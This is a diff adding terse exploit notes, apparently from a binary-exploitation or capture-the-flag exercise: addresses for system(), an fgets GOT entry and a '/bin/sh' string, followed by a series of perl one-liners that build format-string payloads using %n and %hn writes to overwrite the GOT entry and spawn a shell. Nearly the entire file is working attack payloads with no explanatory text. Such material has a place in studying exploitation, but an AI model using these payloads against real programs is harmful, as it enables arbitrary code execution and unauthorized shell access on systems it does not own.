@@ -1,0 +1,33 @@
+0xf7dff830 <system>
+63455 63536
+12536 57335
+0x5eab010, fgets plt location
+
+"AA" + "%4158650410x" + "%8$n"
+
+perl -e 'print "AA" . "\x10\xb0\xea\x05" . "\x12\xb0\xea\x05" . "%12526x" . "%8\$hn" . "%44799x" . "%9\$hn" '
+
+perl -e 'print "AA" . "\x12\xb0\xea\x05" . "\x10\xb0\xea\x05" . "%63445x" . "%8\$n" . "%81x" . "%9\$hn" '
+
+perl -e 'print "AA" . "\x12\xb0\xea\x05" .  "%63445x" .  "\x10\xb0\xea\x05" . "%8\$hn" . "%81x" . "%9\$hn" '
+
+perl -e 'print "AA" . "\x10\xb0\xea\x05" . "%4158650410x" . "%8\$n" '
+
+perl -e 'print "A"x18 . "\x12\xb0\xea\x05" . "\x10\xb0\xea\x05" . "\n" ' >| in
+
+perl -e 'print "%63455x" . "%12\$hn" . "%81x" . "%13\$hn" ' >> in
+
+
+0x5bc3010, fgets plt location
+
+perl -e 'print "AA" . "\x12\x30\xbc\x05" .  "%63445x" .  "\x10\x30\xbc\x05" . "%8\$hn" . "%81x" . "%9\$hn" '
+
+perl -e 'print "\x12\x30\xbc\x05" . "\x10\x30\xbc\x05" . "%63447x" . "%7\$n" . "%81x" . "%8\$hn" '
+
+perl -e 'print "\x0e\x30\xbc\x05" . "\x0c\x30\xbc\x05" . "%63447x" . "%7\$n" . "%81x" . "%8\$hn" . "\n" . "\x52\xc3\xf4\xf7" '
+
+0xf7f4c352 - 0xf7f4c359  →   "/bin/sh" 
+
+perl -e 'print "/bin/sh\x00" . "\x12\x30\xbc\x05" . "\x10\x30\xbc\x05" . "%63439x" . "%9\$n" . "%81x" . "%10\$hn" '
+
+perl -e 'print "\x0c\x30\xbc\x05" . "\x0e\x30\xbc\x05" . "%6472x" . "%7\$hn" . "%56980x" . "%8\$hn" . "\n" . "xterm" '
